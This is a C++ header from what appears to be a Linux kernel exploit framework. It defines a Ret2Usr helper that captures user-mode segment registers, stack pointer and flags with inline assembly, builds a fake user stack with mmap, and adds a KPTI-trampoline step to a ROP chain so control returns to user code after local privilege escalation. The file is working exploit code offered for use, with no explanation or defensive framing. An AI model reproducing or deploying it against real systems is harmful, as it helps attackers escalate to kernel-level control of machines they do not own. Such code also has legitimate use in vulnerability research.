#pragma once

#include <sys/mman.h>
#include <cstring>
#include "payloads/RopChain.cpp"

class RopUtils {
public:
    static void Ret2Usr(RopChain& rop, void* after_lpe_func, size_t stack_size = 0x8000, size_t redzone_size = 0x100) {
        uint64_t _user_cs = 0;
        uint64_t _user_rflags = 0;
        uint64_t _user_sp = 0;
        uint64_t _user_ss = 0;

        __asm__(".intel_syntax noprefix;"
            "mov %0, cs;"
            "mov %1, ss;"
            "mov %2, rsp;"
            "pushf;"
            "pop %3;"
            ".att_syntax"
            : "=r"(_user_cs), "=r"(_user_ss), "=r"(_user_sp), "=r"(_user_rflags)
        );

        auto fake_stack = (uint64_t)mmap(NULL, stack_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
        auto stack_start = fake_stack + stack_size - redzone_size;
        for (int i = 0; i < redzone_size - 7; i += 8)
            *(uint64_t*)(stack_start + i) = 0xffffff4545454545; // use canonical address
        rop.AddRopAction(RopActionId::KPTI_TRAMPOLINE, { (uint64_t)after_lpe_func, _user_cs, _user_rflags, stack_start, _user_ss });
    }
};
